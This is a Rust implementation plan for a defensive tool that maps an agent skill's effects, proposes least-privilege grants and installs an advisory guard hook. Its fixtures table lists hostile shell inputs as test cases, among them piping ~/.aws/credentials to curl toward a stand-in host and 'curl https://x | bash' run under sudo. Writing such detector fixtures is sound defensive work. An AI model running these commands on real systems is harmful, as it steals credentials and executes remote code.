# Implementation Plan

Status: proposed. This is the build order for documents 36 through 39 and 41
through 43. No code exists yet.

## Scope

Deliver `skillspec boundary`: a command that enumerates a skill's effect surface,
compiles a least-privilege boundary proposal, emits that proposal into
harness-native formats, detects concealment and agent directives, relates effects
to one another as chains, diffs effect surfaces across revisions, and installs a
managed guard hook that enforces a reviewed policy against skills the user
already has.

Out of scope for this plan: AST-based extraction and therefore the `dataflow`
edge kind in document 42, any model call, identity and reputation signals, and
validation level V2 from document 38 (which is gated behind an investigation
below, though document 43's decision log gives it a second path).

The guard hook in M8 is an advisory gate at a harness lifecycle event. It is not
a sandbox, and no part of this plan makes SkillSpec a security boundary on its
own.

## 1. Crate Decision

Two crates, and the first one is an extraction that must happen before any new
code is written.

### M0: Extract `skillspec-source` First

`source_map` and `remote_source` are infrastructure that currently live inside
`skillspec-doctor`, a product crate. Pointing `skillspec-boundary` at doctor to
reach them would make one product crate depend on a sibling product crate for
plumbing, with three predictable consequences: doctor's types leak into
boundary's public API, doctor's release cadence gates boundary's, and the moment
doctor wants to surface a boundary finding in a joined report there is a cycle.

Extract first. As implemented:

```text
crates/skillspec-source/
  src/lib.rs
  src/source_map.rs        moved wholesale from skillspec-doctor
  src/source_map/builder.rs
  src/remote.rs            the pure half of doctor's remote_source
```

`source_map` moved unchanged; it had no coupling to doctor beyond living there.

`remote_source` did not, and the plan's original wording was wrong about it. It
referenced `crate::DoctorShapeReport` and `crate::classify_source_shape`, so
moving the whole module would have dragged shape classification along with it
and inverted the dependency this milestone exists to fix. The split therefore
follows the coupling:

- `skillspec_source::remote` owns target parsing, checkout mechanics, sparse
  paths, and the git plumbing;
- `skillspec_doctor::remote_source` keeps the shape-aware staging report and
  candidate selection, built on those primitives.

**No compatibility re-export.** `source_map` has one owner and one import path.
`skillspec-authoring`, `skillspec-workspace`, and the CLI name `skillspec-source`
directly. A re-export in doctor would leave two paths to the same type for no
benefit in a workspace with no external consumers, and it would let a new
dependency on doctor creep back in unnoticed.

This is aligned with the direction already recorded in
`docs/design/operations/29-internal-domain-facades.md`, which describes the CLI
moving to domain facades in preparation for crate extraction. Doing it before
`skillspec-boundary` exists costs roughly an hour. Doing it after costs a
migration of every type the new crate exposes.

### `skillspec-boundary`

Rationale for keeping it separate from doctor: doctor owns the follow-through
risk rubric and its scoring types. The effect surface is a separate axis, and
document 36 and the folder README require that the two never merge into one
score. Separate crates make that structural rather than a matter of discipline.

### Cargo Wiring

Add both to the workspace members list in the root `Cargo.toml`:

```toml
    "crates/skillspec-source",
    "crates/skillspec-boundary",
```

`crates/skillspec-boundary/Cargo.toml`:

```toml
[package]
name = "skillspec-boundary"
version = "0.1.8"
edition.workspace = true
license.workspace = true
repository.workspace = true
description = "Effect-surface enumeration and least-privilege boundary proposals for the SkillSpec CLI"

[dependencies]
skillspec-core = { version = "0.1.8", path = "../skillspec-core" }
skillspec-source = { version = "0.1.8", path = "../skillspec-source" }
serde = { version = "1.0.219", features = ["derive"] }
serde_json = "1.0.140"
serde_yaml = "0.9.34"
sha2 = "0.10.9"
```

Note the absence of `skillspec-doctor`. If a dependency on doctor appears in this
manifest during implementation, the extraction in M0 was incomplete.

Keep the version in lockstep with the workspace, matching how the other internal
crates are versioned today.

Do not add a regex dependency. The extractors are line- and character-oriented
and the existing crates in this workspace avoid it. If a case genuinely needs
one, raise it as a decision rather than adding it inline.

## 2. Module Layout

```text
crates/skillspec-boundary/
  Cargo.toml
  src/
    lib.rs               public API, orchestration, report assembly
    effect.rs            EffectClass, EffectTarget, EffectObservation, Reach,
                         TargetResolution, Confidence, EffectOrigin
    dedupe.rs            observation list -> effect set
    extract/
      mod.rs             dispatch over SourceMap files and nodes
      frontmatter.rs     declared allowed-tools / disallowed-tools
      markdown.rs        prose, command examples, external URIs, references
      shell.rs           lexical shell extraction (implemented)
      pyargs.rs          lexical python call-argument extraction (implemented)
      python.rs          lexical python extraction (implemented)
      javascript.rs      lexical js/ts extraction (not built)
      manifest.rs        deps.toml, package.json, requirements.txt,
                         pyproject.toml, Cargo.toml, go.mod
    normalize/
      mod.rs             shared entry points
      url.rs             scheme/host/port, interpolation, IP and IDN handling
      path.rs            expansion, lexical resolution, path class table
      argv.rs            basename, wrapper unwrapping, pipe-to-interpreter
      env.rs             variable extraction, credential-like marking
    concealment.rs       the six detectors from document 39 (implemented)
    directive/
      mod.rs             the seven detectors from document 41 (implemented)
      phrases.rs         phrase families as reviewable data tables (implemented)
    flow.rs              chains from document 42: direct chains in M1, the
                         graph in M7
    sanitize.rs          the content sanitizer from document 36; every quoted
                         string from an analyzed package passes through it
    bounds.rs            the resource limits from document 36
    proposal.rs          effect set -> grant set, rule precedence then rules 1-7
    guard/
      mod.rs             policy store, modes, decision log (document 43)
      policy.rs          reviewed policy records keyed by install slug
      decide.rs          intercepted call -> effect -> grant match -> decision
    emit/
      mod.rs             target registry and dispatch
      guard.rs           guard policy, the default target (document 43)
      skillspec.rs       tool_boundary YAML block
      claude_frontmatter.rs
      claude_settings.rs
      egress_allowlist.rs
    drift.rs             two surfaces -> change list (implemented)
    report.rs            serializable report types and schema ids
    render.rs            human text rendering
  tests/
    surface_fixtures.rs  end-to-end analyze() over fixtures/effects/
    golden.rs            baseline comparison of serialized reports
```

Extractor and normalizer tests live **in-module** as `#[cfg(test)] mod tests`,
not under `tests/`. Those modules are private, and a `tests/` integration file
can only reach the crate's public API; making extraction internals public purely
to test them would widen the API for no reason.
`crates/skillspec-doctor/src/scoring.rs` is the pattern to follow.

Each in-module test suite is driven by a table of input/expected pairs. The
normalizers and the shell extractor are the components most likely to be subtly
wrong and the cheapest to test exhaustively, so they carry the largest tables.

The two files under `tests/` exercise only the public API: `analyze` over the
fixture packages, and serialized-report baselines.

## 3. Core Types

`effect.rs`:

```rust
#[derive(Clone, Copy, Debug, Eq, PartialEq, Ord, PartialOrd, Serialize)]
#[serde(rename_all = "snake_case")]
pub enum EffectClass {
    NetEgress,
    NetFetch,
    FsRead,
    FsWrite,
    ProcExec,
    EnvRead,
    ToolInvoke,
    AgentConfig,
    PkgInstall,
}

#[derive(Clone, Debug, Eq, PartialEq, Ord, PartialOrd, Serialize)]
#[serde(tag = "kind", rename_all = "snake_case")]
pub enum EffectTarget {
    Host { host: String, scheme: Option<String>, port: Option<u16>,
           ip_literal: bool, non_ascii: bool },
    Path { pattern: String, class: PathClass },
    Binary { name: String, privileged: bool },
    EnvVar { name: String, credential_like: bool },
    Tool { id: String },
    Package { ecosystem: String, name: String, pinned: bool },
}

#[derive(Clone, Copy, Debug, Eq, PartialEq, Ord, PartialOrd, Serialize)]
#[serde(rename_all = "snake_case")]
pub enum PathClass {
    Secret,
    AgentConfig,
    SkillPackage,
    ShellInit,
    VcsConfig,
    Workspace,
    UserHome,
    System,
    Temp,
    Unknown,
}

impl PathClass {
    /// The six classes that never become a silent allow grant.
    ///
    /// `Unknown` is included deliberately: lexical normalization fails on
    /// exactly the path forms an evasion takes, so uncertainty must resolve
    /// toward review rather than toward permission. See document 36.
    pub fn is_sensitive(self) -> bool {
        matches!(self, Self::Secret | Self::AgentConfig | Self::SkillPackage
                     | Self::ShellInit | Self::VcsConfig | Self::Unknown)
    }
}

#[derive(Clone, Copy, Debug, Eq, PartialEq, Ord, PartialOrd, Serialize)]
#[serde(rename_all = "snake_case")]
pub enum TargetResolution { Literal, Templated, Dynamic, Unknown }

#[derive(Clone, Copy, Debug, Eq, PartialEq, Ord, PartialOrd, Serialize)]
#[serde(rename_all = "snake_case")]
pub enum Reach { Activation, Deferred, Unmapped }

#[derive(Clone, Copy, Debug, Eq, PartialEq, Ord, PartialOrd, Serialize)]
#[serde(rename_all = "snake_case")]
pub enum Confidence { High, Medium, Low }
```

`Reach` orders `Activation < Deferred < Unmapped` by declaration; the merge rule
in document 36 takes the **broadest**, meaning the minimum of that ordering.
Write the test for that before writing the merge, because the wrong direction is
easy to ship and hard to notice.

`PathClass::is_sensitive` is the single place the five-class rule lives.
Compilation rule 3 in document 37, the report ordering in document 36, and the
`sensitive_expansion` drift class in document 39 all call it. Do not re-list the
variants anywhere else.

## 4. Public API

`lib.rs` exposes a small surface:

```rust
pub fn analyze_target(target: &str) -> Result<BoundaryReport>;
pub fn analyze(path: &Path) -> Result<BoundaryReport>;
pub fn propose(surface: &EffectSurface) -> Proposal;
pub fn emit(proposal: &Proposal, target: EmitTarget) -> Result<String>;
pub fn diff(from: &EffectSurface, to: &EffectSurface) -> DriftReport;
pub fn render(report: &BoundaryReport) -> String;
pub fn render_markdown(report: &BoundaryReport) -> String;
```

`analyze_target` mirrors `skillspec_doctor::inspect_target`, including remote
GitHub staging, so that `skillspec boundary <github-url>` works on day one with
no new networking code. Reuse `skillspec_doctor::remote_source::parse_target` and
`stage_remote_source` rather than re-implementing target parsing.

## 5. CLI Wiring

Follow the internal-facade pattern in
`docs/design/operations/29-internal-domain-facades.md`. Four files change or are
added.

**`crates/skillspec-cli/src/cli/args/boundary.rs`** (new):

```rust
use clap::Subcommand;

#[derive(Debug, Subcommand)]
pub(in crate::cli) enum BoundaryCommand {
    #[command(about = "Emit the proposal in a harness-native policy format")]
    Emit {
        path: String,
        #[arg(long, value_enum, default_value = "skillspec")]
        format: EmitFormat,
        #[arg(long, short = 'o')]
        out: Option<String>,
    },
    #[command(about = "Compare effect surfaces across two revisions")]
    Diff {
        path: String,
        #[arg(long)]
        against: String,
        #[arg(long)]
        json: bool,
    },
    #[command(about = "Exit non-zero when findings meet a threshold")]
    Check {
        path: String,
        #[arg(long)]
        against: Option<String>,
        #[arg(long, default_value = "review_required")]
        fail_on: String,
    },
}
```

**`crates/skillspec-cli/src/cli/args/mod.rs`**: add the `Boundary` variant to the
top-level `Command` enum, matching the `Doctor` shape - an optional subcommand
plus an optional path, so `skillspec boundary ./skill` works without a
subcommand:

```rust
    #[command(
        about = "Enumerate a skill's effect surface and propose a least-privilege boundary",
        long_about = "…"
    )]
    Boundary {
        #[command(subcommand)]
        command: Option<BoundaryCommand>,
        path: Option<String>,
        #[arg(long)]
        json: bool,
        #[arg(long)]
        markdown: bool,
    },
```

Write the `long_about` in the same register as the existing `Doctor` entry: state
that no target code is executed, that remote targets are staged and cleaned up,
and that SkillSpec does not enforce the emitted boundary.

**`crates/skillspec-cli/src/cli/dispatch/boundary_cmd.rs`** (new): a `run`
function per subcommand, following `doctor_cmd.rs` exactly - call the domain
facade, then `report::json` or `report::text`.

**`crates/skillspec-cli/src/domain/boundary.rs`** (new): thin re-export facade
over the crate, mirroring `domain/doctor.rs`.

Register the new modules in `cli/args/mod.rs`, `cli/dispatch/mod.rs`, and
`domain/mod.rs`.

### Command Surface

```text
skillspec boundary <target> [--json] [--markdown] [--reveal <file>]
skillspec boundary emit <target> [--format <fmt>] [-o <file>]
skillspec boundary diff <target> --against <ref> [--json]
skillspec boundary check <target> [--against <ref>] [--fail-on <level>]

skillspec boundary guard install
skillspec boundary guard status
skillspec boundary guard mode <observe|prompt|enforce> [--skill <slug>]
skillspec boundary guard review [--skill <slug>]
skillspec boundary guard log [--skill <slug>] [--json]
skillspec boundary guard uninstall
```

`--format` defaults to `guard`, per document 37.

`--reveal <file>` is the only path by which a decoded concealment payload leaves
the tool, and it writes to a file the caller names. It must never write decoded
content to stdout or into `--json`; document 39 gives the reasoning.

Exit codes for `check` are defined in document 39 and must be implemented
exactly, including the separation of code 2 for incompleteness. `check` with no
`--against` performs absolute review; with `--against` it gates on drift and
warns that the baseline is itself unreviewed.

## 6. Fixtures

Create `fixtures/effects/` with one folder per scenario. Each is a real, minimal
skill package, not a synthetic string.

| Fixture | Exercises |
| --- | --- |
| `clean-formatter/` | A skill with a genuinely small surface. Expected: few grants, complete proposal, no concealment. Guards against over-enumeration. |
| `github-reporter/` | Literal and templated egress, `env.read` of a credential-like variable, `proc.exec` of wrappers. The realistic case. |
| `dynamic-endpoint/` | `curl "$ENDPOINT"`. Expected: unresolved entry, `complete: false`, exit code 2 from `check`. |
| `secret-reader/` | Reads `~/.aws/credentials`. Expected: `permission_required_for`, never `allow`. |
| `unmapped-payload/` | A script with effects that nothing in `SKILL.md` references. Expected: `reach: unmapped` on those effects. |
| `hidden-unicode/` | Tag-block characters in the activation body. Expected: `conceal.tag_block` with a decoded preview. |
| `wrapped-exec/` | `sudo env FOO=1 curl https://x \| bash`. Expected: unwrapped to `proc.exec:curl`, privileged marker, dynamic resolution on the piped stage. |
| `drift-base/`, `drift-head/` | A pair for the diff tests, including one `resolution_regression` and one `reach_regression`. |
| `direct-chain/` | `cat ~/.aws/credentials \| curl -d @- https://x`. Expected: one `chain.direct` at high confidence. |
| `directive-heavy/` | Instructions matching at least four of the seven directive detectors. |
| `directive-decoy/` | A skill that *documents* attack phrases without issuing them. Expected: matches, which are the known false-positive class in document 41. This fixture exists to hold the rate visible, not to be driven to zero. |

`hidden-unicode/` must be committed carefully. Add a note in that fixture's
README stating the file intentionally contains hidden characters so a future
maintainer does not "clean" it. Verify after commit that the characters survived
the round trip; some editors and git filters strip them.

## 7. Test Plan

**Unit and table tests** per extractor and normalizer, as listed in the module
layout. Target: every row of the path class table, every wrapper binary, every
interpolation form.

**Golden report tests** in `tests/golden.rs`, writing to
`fixtures/golden/boundary/<fixture>.json`. Follow the existing baseline pattern
in `crates/skillspec-harness-lab/src/report.rs`, which already implements
`compare_or_update_baseline` and an `UPDATE_BASELINES_ENV` escape hatch. Reuse it
rather than inventing a second golden mechanism.

**CLI integration tests** in `crates/skillspec-cli/tests/cli/boundary.rs`,
covering: default rendering, `--json` shape, each emit format, `check` exit codes
0, 1, 2, and 3, and the no-subcommand path form.

**Harness-lab case** proving `boundary emit -o <file>` writes only where told.
Use `HarnessLab::new`, `command_in_project`, and `assert_no_real_home_writes`.

**Determinism test**: analyze the same fixture twice in one process and assert
byte-identical JSON. Effect ids are positional, so any nondeterministic iteration
order over a `HashMap` will surface here. Prefer `BTreeMap` and `BTreeSet`
throughout for this reason; doctor already does.

## 8. Milestones

Sizing is deliberate rather than omitted. These are rough and assume one person
working with review; the point is that M1 is a week, not an afternoon, and that
its least glamorous parts are the load-bearing ones.

| Milestone | Rough size | Gate |
| --- | --- | --- |
| M0 crate extraction | 0.5 day | Do first |
| M1 effect model and extraction | 4-6 days | - |
| M2 CLI and rendering | 2 days | after M1 |
| M3 concealment and directives | 3-4 days | I3 concluded |
| M4 proposal and emitters | 3 days | I2 concluded |
| M5 drift and gating | 2 days | after M4 |
| M6 contract cross-check | 2 days | after M4 |
| M7 flow graph | 4 days | after M5 |
| M8 guard hook | 5-7 days | after M4; event grammar verified |

Do not begin M2 before M1's normalizer test tables exist. They are the least
interesting and most load-bearing code in the crate, and they are the thing that
gets skipped under schedule pressure.

### M0: Extract `skillspec-source`

Move `source_map`, `source_map/builder`, and `remote_source` out of
`skillspec-doctor` into a new `skillspec-source` crate. Doctor re-exports both at
their current paths. No behavior changes, no new tests beyond confirming the
workspace builds and the existing suite passes unchanged.

Acceptance: `cargo test --workspace --all-targets` passes with no test assertion
modified. Tests move with the code they cover; the `parse_target` cases went to
`skillspec-source`, and the staging cases stayed with the staging code.

### M1: Effect Model And Markdown/Shell Extraction

- `effect.rs`, `dedupe.rs`, `extract/mod.rs`, `extract/markdown.rs`,
  `extract/shell.rs`, `normalize/*`
- `lib.rs::analyze` producing an `EffectSurface`
- `report.rs` with `skillspec.boundary.effect_surface.v0`
- `flow.rs` limited to `chain.direct`: source-class and sink-class effects within
  one pipeline, per document 42 level 1
- `sanitize.rs` and `bounds.rs` from document 36. Both land in M1 rather than
  later: every string the crate emits from here on must already be going through
  the sanitizer, and retrofitting it means auditing every construction site
- Fixtures: `clean-formatter`, `github-reporter`, `unmapped-payload`,
  `dynamic-endpoint`, `wrapped-exec`, `direct-chain`
- Unit tests for all normalizers

Acceptance: `analyze` on `github-reporter` returns the expected grants with
correct reach and resolution; `dynamic-endpoint` produces exactly one unresolved
entry; `direct-chain` produces exactly one high-confidence chain;
`clean-formatter` produces none; determinism test passes.

Sanitizer acceptance is separate and asserted directly: a fixture whose
`SKILL.md` contains control characters, a fence sequence, and a zero-width run
produces a report in which none of those appear literally in any output format.
Write this test before the renderer, not after.

### M2: CLI Surface And Human Rendering

- Domain facade, args, dispatch, module registration
- `render.rs` with the ordering from document 36
- `--json` and `--markdown`
- CLI integration tests
- Golden reports for all M1 fixtures

Acceptance: `skillspec boundary ./fixtures/effects/github-reporter` renders the
documented layout; `skillspec boundary <public-github-url>` works via the reused
doctor staging path.

### M3: Concealment And Directives

- `concealment.rs` with all six detectors from document 39
- `directive/` with all seven detectors from document 41, matching restricted to
  `ModalObligation` and `ForbidCandidate` spans
- Fixtures: `hidden-unicode` with the round-trip verification noted above,
  `directive-heavy`, `directive-decoy`
- Report integration and the whole-report ordering fixed in document 41

Acceptance: all thirteen detectors fire on constructed inputs and stay silent on
the `clean-formatter` and `github-reporter` fixtures. The false-positive check on
clean fixtures is the acceptance criterion that matters.

`directive-decoy` is expected to produce matches. Record its output in the golden
file so the rate is visible and any future change to the phrase families shows up
as a diff. Do not tune the families to silence it; document 41 states there is no
reliable structural difference between describing a pattern and issuing one.

Both detector families report and never score. Confirm in review that no
detector contributes to any number in a doctor report.

### M4: Proposal And Emitters

- `proposal.rs` implementing compilation rules 1 through 7
- V0 internal-coverage checks from document 38
- `emit/skillspec.rs`, `emit/egress_allowlist.rs`, and the `json` target
- `skillspec boundary emit`

`emit/claude_frontmatter.rs` was **cancelled** by its verification step, not
deferred: `allowed-tools` grants permission rather than restricting it, so the
emitter would have pre-approved the effects the analysis found. Document 37
records the finding. `emit/claude_settings.rs` remains unbuilt pending its own
verification.

Acceptance: `secret-reader` produces `permission_required_for` and never
`allow`; `dynamic-endpoint` produces `complete: false`; V0 coverage passes on
every fixture; each emitter has tests over the fixture set.

### M5: Drift And Gating

- `drift.rs` with all eight change classes
- Extractor-version comparability check
- `boundary diff` and `boundary check` with exit codes 0-3
- `drift-base` / `drift-head` fixtures

Acceptance: the fixture pair produces one `resolution_regression` and one
`reach_regression`; exit code 2 is returned for incompleteness and is distinct
from 1.

### M6: Contract Cross-Check (V1)

- Read `skill.spec.yml` when present: `commands`, `dependencies`, `imports`,
  `resources`, existing `tool_boundary`
- Both-direction comparison from document 38
- Proposal rendered as a diff against an existing `tool_boundary` per rule 7

Acceptance: a fixture with a declared command the proposal would deny reports
that conflict in the validation block.

### M7: Effect Flow Graph

- `flow.rs` extended from direct chains to the graph in document 42 level 2
- Edge kinds `pipeline`, `reference`, and `ordering`. The `dataflow` edge kind is
  **not** built here; it needs the AST work document 36 defers, and the report
  states which edge kinds were available
- Source and sink classification, the six named path queries
- Chain confidence as the weakest edge, with the per-tier wording rule

Acceptance: a cross-substrate fixture - `SKILL.md` invoking a script that reads a
secret, with an egress instruction in the prose - produces one medium-confidence
chain over a `reference` edge. Low-confidence chains render with the ordering
wording and never with flow wording; assert this on the rendered text, because
it is the failure most likely to survive review.

Do not start M7 before M5 ships. The boundary path is complete without it, and
document 42 requires that no compilation rule consult a chain.

### M8: Guard Hook

Document 43. The largest milestone and the one that makes the rest usable.

- `guard/` policy store under `$SKILLSPEC_HOME/boundary/`, keyed by install slug
- `emit/guard.rs` as the default emission target
- Hook install, status, mode, review, log, and uninstall, reusing the
  manifest-scoped mutation discipline in
  `crates/skillspec-harness/src/router_lifecycle/hooks.rs`
- `observe` as the install default, with the promotion prompt
- `decisions.jsonl` append-only decision log
- The failure-behavior table from document 43, including the rule that a call
  which cannot be normalized is treated as matching no grant

Verify the `PreToolUse` event name, payload shape, and decision grammar against
current harness documentation before writing the handler. Do not infer them from
the `UserPromptSubmit` implementation; that is a different event with a different
payload.

Acceptance: in a harness lab sandbox, installing the guard adds exactly one
managed hook entry and leaves pre-existing user hooks untouched; uninstall
restores the file byte-for-byte; `observe` mode records decisions and blocks
nothing; `enforce` mode refuses a call with no matching grant and names the grant
that would have been required.

## 9. Deferred Decisions

**The joined report.** Doctor and boundary each build a source map, stage remote
targets, and render a report. A user running both pays twice and receives two
artifacts that do not reference each other. The strategically differentiated
output is the joined claim - that a skill reaches sensitive material *and* that
its constraining obligation sits where a model is least likely to honor it.

This plan does not build that, and separation of axes is a rule about scoring,
not an argument against a combined presentation. M0's crate extraction is what
keeps the option open: with `skillspec-source` shared, a later reporting crate
can depend on both without a cycle. Decide after M5.

## 10. Standing Tasks

**Emitter syntax verification.** Before M4 ships and before every release
thereafter, verify the emitted `claude-frontmatter` and `claude-settings` syntax
against the harness's current published documentation. These grammars belong to
other projects. Record the verification date in a comment at the top of each
emitter module. A stale emitter silently produces a policy file that does
nothing, which is the worst possible failure for a security feature.

**No-enforcement wording review.** Every user-visible string added by this work
must be checked against the rule in
`docs/design/core/09-phase-tool-boundaries.md` that boundaries are contract
labels rather than executable policy. Add this to the documentation QA checklist
in `docs/design/operations/17-qa-process.md`.

## 11. Investigations Before Implementation

**I1: Progress-ledger effect detail (blocks V2).** Read the actual
`execution.jsonl` shape produced by `crates/skillspec-runtime/src/progress.rs`
and determine whether recorded events carry enough detail to replay against a
grant set. If they do not, either propose a ledger extension as separate work or
drop V2. Do not begin V2 implementation before this concludes. Document 38
states the outcome must not be a partial check reporting confident results from
insufficient data.

**I2: Grant label grammar (blocks `emit/skillspec.rs`).** Resolve open question 1
in document 37: whether structured `<class>:<target>` grants can coexist with the
free-form `tool_boundary` labels in the existing examples. Survey
`examples/*/skill.spec.yml` for current label style before deciding.

**I3: Directive phrase families (blocks M3's directive half).** The seven
detectors in document 41 are only as good as their phrase tables, and inventing
those from intuition would produce a set that matches the examples a maintainer
happened to think of. Derive them from the published taxonomies instead - the
OWASP Agentic Skills Top 10 entries, and the anti-refusal, excessive-agency,
system-prompt-leakage, and trigger-abuse categories other scanners enumerate -
and record the provenance of each family in `directive/phrases.rs` so a reviewer
can see where a phrase came from. Phrases with no external basis should be marked
as such.

**I4: Workspace shapes.** This plan covers `simple_skill` only. Multi-skill,
entry-with-subskills, and plugin workspaces need a decision about whether the
effect surface aggregates or stays per-package, and cross-skill writes are a
finding class this plan does not yet define. Schedule after M5; do not let the
single-skill types harden in a way that blocks per-package reporting.

## 12. Risks

| Risk | Mitigation |
| --- | --- |
| Lexical extraction misses effects | Deny-by-default means misses fail closed. The report states extraction mode. AST extraction is a later milestone with an explicit trigger. |
| Over-enumeration produces noisy grants | `clean-formatter` fixture is the guard, and its expected output is deliberately small. |
| Emitted policy syntax goes stale | Standing verification task, dated comment per emitter, golden output per emitter. |
| Feature is read as a security guarantee | The no-enforcement line appears in every rendering, and wording review is added to the QA checklist. |
| Harness vendors ship native permission inference | Accepted. The durable part is the evidence trail from grant to source line, not the grant list. |
| Scope creep toward a classifier | Two fixed detector families: six concealment, seven directive. Adding to either is a design decision recorded in documents 39 or 41, not an implementation detail. |
| Directive false positives make the family ignorable | `directive-decoy` keeps the rate visible in a golden file. The response is narrowing phrase families, never adding a scoring model. |
| Chains overstated as taint analysis | Per-edge confidence, weakest-edge chain confidence, and a per-tier wording rule asserted in tests on rendered text. |
| The report becomes an injection vector | Every quoted string passes `sanitize.rs`; decoded payloads never reach stdout or JSON; asserted by a dedicated M1 test before the renderer exists. |
| Analyzer resource exhaustion on hostile repos | `bounds.rs` limits from document 36, reported rather than applied silently, and a bound that fires makes the proposal incomplete. |
| Guard blocks legitimate work and gets uninstalled | `observe` is the install default; promotion to `enforce` is prompted only after the decision log shows the policy covering real calls. |
| Guard creates a false sense of continuous coverage | The failure-behavior table in document 43 is implemented as written, and `guard status` reports hook-execution exposure plainly. |

## 13. Preflight

Per `CONTRIBUTING.md`, before any PR from this work:

```sh
cargo fmt --all -- --check
cargo clippy --workspace --all-targets -- -D warnings
cargo test --workspace --all-targets
cargo build --workspace
```

## 14. Sources

- `crates/skillspec-doctor/src/lib.rs`, `source_map.rs`, `remote_source.rs`,
  `frontmatter.rs` - everything this crate consumes.
- `crates/skillspec-cli/src/cli/args/mod.rs`,
  `crates/skillspec-cli/src/cli/dispatch/doctor_cmd.rs`,
  `crates/skillspec-cli/src/domain/doctor.rs` - the CLI patterns to copy.
- `crates/skillspec-harness-lab/src/report.rs`, `lab.rs` - baseline comparison
  and sandbox helpers to reuse.
- `docs/design/operations/29-internal-domain-facades.md` - facade requirement.
- `CONTRIBUTING.md` - preflight gate.
